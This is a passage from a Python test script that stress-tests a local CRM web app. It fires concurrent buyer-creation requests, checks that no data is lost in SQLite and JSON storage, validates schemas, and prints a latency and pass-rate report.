                "latency_ms": lat,
                "error": None
            }
        except Exception as ex:
            lat = (time.perf_counter() - t_start) * 1000
            return {
                "index": index,
                "status_code": 0,
                "ok": False,
                "buyer": None,
                "latency_ms": lat,
                "error": str(ex)
            }

    t0_all = time.perf_counter()
    responses = []
    with ThreadPoolExecutor(max_workers=num_requests) as executor:
        futures = [executor.submit(send_single_buyer, i) for i in range(1, num_requests + 1)]
        for f in as_completed(futures):
            res = f.result()
            responses.append(res)
            track_latency("Concurrent POST /api/portfolio/.../buyer", res["latency_ms"])

    total_time_ms = (time.perf_counter() - t0_all) * 1000
    
    # Analyze responses
    success_count = sum(1 for r in responses if r["status_code"] == 200 and r["ok"] is True)
    error_count = num_requests - success_count
    latencies = [r["latency_ms"] for r in responses]
    avg_lat = sum(latencies) / len(latencies)
    max_lat = max(latencies)
    min_lat = min(latencies)
    
    print(f"\n[*] Concurrency Execution Finished in {total_time_ms:.2f}ms")
    print(f"    - Success: {success_count}/{num_requests}")
    print(f"    - Failures: {error_count}")
    print(f"    - Latency (ms): Min={min_lat:.2f}, Avg={avg_lat:.2f}, Max={max_lat:.2f}")

    record_result(
        "Concurrency: HTTP",
        f"{num_requests} simultaneous buyer creations (HTTP 200 checks)",
        success_count == num_requests,
        avg_lat,
        f"Success: {success_count}/{num_requests}, Max Latency: {max_lat:.2f}ms"
    )

    # 3.2 Verify Race Conditions in SQLite Database
    print("\n[*] Verifying SQLite table 'portfolio_listing_buyers' data integrity...")
    conn = sqlite3.connect(SQLITE_DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT id, name, offer FROM portfolio_listing_buyers WHERE refId = ?", (concurrency_ref,))
    sql_rows = cur.fetchall()
    conn.close()
    
    sql_saved_count = len(sql_rows)
    print(f"    - Rows found in SQLite for refId '{concurrency_ref}': {sql_saved_count}/{num_requests}")
    record_result(
        "Concurrency: SQLite",
        f"Zero row-loss in SQLite under {num_requests} concurrent writes",
        sql_saved_count == num_requests,
        0,
        f"Persisted {sql_saved_count} of {num_requests} rows"
    )

    # 3.3 Verify Race Conditions in JSON File (portfolio_listing_dashboards.json)
    print("\n[*] Verifying JSON dashboard 'static/data/portfolio_listing_dashboards.json' data integrity...")
    json_buyers_count = 0
    with open(JSON_DASHBOARD_PATH, "r", encoding="utf-8") as f:
        dash_data = json.load(f)
        if concurrency_ref in dash_data:
            json_buyers = dash_data[concurrency_ref].get("buyers", [])
            json_buyers_count = len(json_buyers)
            
    print(f"    - Buyers found in JSON dashboard for refId '{concurrency_ref}': {json_buyers_count}/{num_requests}")
    record_result(
        "Concurrency: JSON",
        f"Zero buyer-loss in JSON file under {num_requests} concurrent writes",
        json_buyers_count == num_requests,
        0,
        f"Persisted {json_buyers_count} of {num_requests} buyers in JSON"
    )

    # 3.4 Verify GET /api/portfolio/all_buyers returns all concurrent buyers
    t0 = time.perf_counter()
    all_b_res = requests.get(f"{BASE_URL}/api/portfolio/all_buyers", timeout=10)
    lat = (time.perf_counter() - t0) * 1000
    all_b_data = all_b_res.json()
    all_buyers = all_b_data.get("buyers", [])
    matching_in_pool = [b for b in all_buyers if b.get("listingRef") == concurrency_ref]
    pool_count = len(matching_in_pool)
    print(f"    - Buyers appearing in /api/portfolio/all_buyers: {pool_count}/{num_requests}")
    record_result(
        "Concurrency: Sync",
        "All concurrent buyers synchronized in /api/portfolio/all_buyers",
        pool_count == num_requests,
        lat,
        f"Found {pool_count} of {num_requests} in unified CRM pool"
    )


# =============================================================================
# SUITE 4: DATABASE & STORAGE INTEGRITY AUDIT
# =============================================================================
def run_suite_database_integrity():
    print("\n" + "=" * 80)
    print(">>> SUITE 4: DATABASE & STORAGE INTEGRITY AUDIT")
    print("=" * 80)

    # 4.1 SQLite PRAGMA integrity_check
    t0 = time.perf_counter()
    try:
        conn = sqlite3.connect(SQLITE_DB_PATH)
        cur = conn.cursor()
        cur.execute("PRAGMA integrity_check")
        integrity_res = cur.fetchone()[0]
        cur.execute("PRAGMA foreign_key_check")
        fk_res = cur.fetchall()
        cur.execute("SELECT name FROM sqlite_master WHERE type='table'")
        tables = [r[0] for r in cur.fetchall()]
        
        table_counts = {}
        for t in tables:
            cur.execute(f"SELECT count(*) FROM {t}")
            table_counts[t] = cur.fetchone()[0]
        conn.close()
        lat = (time.perf_counter() - t0) * 1000

        is_intact = integrity_res == "ok" and len(fk_res) == 0
        record_result(
            "Database: SQLite",
            "PRAGMA integrity_check & foreign_key_check",
            is_intact,
            lat,
            f"Integrity: {integrity_res}, Total tables: {len(tables)}, Tables: {table_counts}"
        )
    except Exception as e:
        lat = (time.perf_counter() - t0) * 1000
        record_result("Database: SQLite", "PRAGMA integrity_check", False, lat, str(e), "HIGH")

    # 4.2 Validate schema of portfolio_listing_buyers
    try:
        conn = sqlite3.connect(SQLITE_DB_PATH)
        cur = conn.cursor()
        cur.execute("PRAGMA table_info(portfolio_listing_buyers)")
        cols = {row[1]: row[2] for row in cur.fetchall()}
        conn.close()
        
        expected_cols = ["id", "refId", "name", "phone", "offer", "stage", "note", "listingTitle", "createdAt"]
        has_all_cols = all(c in cols for c in expected_cols)
        record_result(
            "Database: Schema",
            "Table portfolio_listing_buyers column schema",
            has_all_cols,
            0,
            f"Columns: {list(cols.keys())}"
        )
    except Exception as e:
        record_result("Database: Schema", "portfolio_listing_buyers schema", False, 0, str(e), "HIGH")

    # 4.3 Validate JSON Storage Integrity (portfolio_listing_dashboards.json)
    try:
        with open(JSON_DASHBOARD_PATH, "r", encoding="utf-8") as f:
            data = json.load(f)
            
        is_dict = isinstance(data, dict)
        total_dashboards = len(data)
        
        # Check that all records have valid keys
        valid_records = True
        total_buyers_in_json = 0
        for ref_id, listing in data.items():
            if not isinstance(listing, dict):
                valid_records = False
                break
            if "platform_stats" not in listing or "buyers" not in listing or "timeline" not in listing:
                valid_records = False
                break
            total_buyers_in_json += len(listing.get("buyers", []))
            
        record_result(
            "Database: JSON",
            "portfolio_listing_dashboards.json schema & valid JSON format",
            is_dict and valid_records,
            0,
            f"Total dashboards: {total_dashboards}, Total buyers: {total_buyers_in_json}"
        )
    except Exception as e:
        record_result("Database: JSON", "portfolio_listing_dashboards.json format", False, 0, str(e), "HIGH")

    # 4.4 Appointments JSON Storage Check
    appt_file = os.path.join("static", "data", "appointments.json")
    if os.path.exists(appt_file):
        try:
            with open(appt_file, "r", encoding="utf-8") as f:
                appts = json.load(f)
            is_valid_appts = isinstance(appts, list)
            record_result(
                "Database: Appointments",
                "appointments.json valid JSON array",
                is_valid_appts,
                0,
                f"Total appointment records: {len(appts)}"
            )
        except Exception as e:
            record_result("Database: Appointments", "appointments.json valid", False, 0, str(e), "NORMAL")


# =============================================================================
# SUMMARY & METRICS REPORTING
# =============================================================================
def generate_summary_report():
    print("\n" + "=" * 80)
    print(">>> FINAL STRESS & AUDIT METRICS REPORT")
    print("=" * 80)

    total_tests = len(test_results)
    passed_tests = sum(1 for t in test_results if t["passed"])
    failed_tests = total_tests - passed_tests
    pass_rate = (passed_tests / total_tests * 100) if total_tests > 0 else 0

    print(f"\n📊 TOTAL TESTS EXECUTED : {total_tests}")
    print(f"✅ PASSED TESTS         : {passed_tests}")
    print(f"❌ FAILED TESTS         : {failed_tests}")
    print(f"📈 OVERALL PASS RATE    : {pass_rate:.1f}%\n")

    print("-" * 80)
    print(f"{'ENDPOINT / OPERATION':<45} | {'CALLS':<6} | {'AVG (ms)':<9} | {'MAX (ms)':<9}")
    print("-" * 80)
    for ep, lats in sorted(endpoint_latencies.items()):
        cnt = len(lats)
        avg_l = sum(lats) / cnt if cnt > 0 else 0
        max_l = max(lats) if cnt > 0 else 0
        print(f"{ep:<45} | {cnt:<6} | {avg_l:<9.2f} | {max_l:<9.2f}")
    print("-" * 80)

    if failed_tests > 0:
        print("\n⚠️ VULNERABILITIES / FAILURES DISCOVERED:")
        for t in test_results:
            if not t["passed"]:
                print(f" - [{t['severity']}] {t['category']} -> {t['name']}: {t['details']}")
    else:
        print("\n🎉 ALL AUDIT TARGETS & INTEGRITY CHECKS PASSED WITH ZERO DATA LOSS!")

    return {
        "total": total_tests,
        "passed": passed_tests,
        "failed": failed_tests,
        "pass_rate": pass_rate,
        "test_results": test_results,
        "endpoint_latencies": {
            ep: {
                "count": len(lats),
                "avg_ms": round(sum(lats) / len(lats), 2) if lats else 0,
                "max_ms": round(max(lats), 2) if lats else 0,
                "min_ms": round(min(lats), 2) if lats else 0
            }
            for ep, lats in endpoint_latencies.items()
        }
    }


if __name__ == "__main__":
    print("\n🚀 Starting NEXA CRM Live Stress Audit on http://127.0.0.1:5000...")
    run_suite_rest_endpoints()
    run_suite_boundary_and_fuzzing()
    run_suite_concurrency_stress()
    run_suite_database_integrity()
    report = generate_summary_report()
    
    # Save test report as JSON artifact
    with open("tests/crm_stress_audit_report.json", "w", encoding="utf-8") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    print(f"\n📁 Saved full audit report to: tests/crm_stress_audit_report.json")
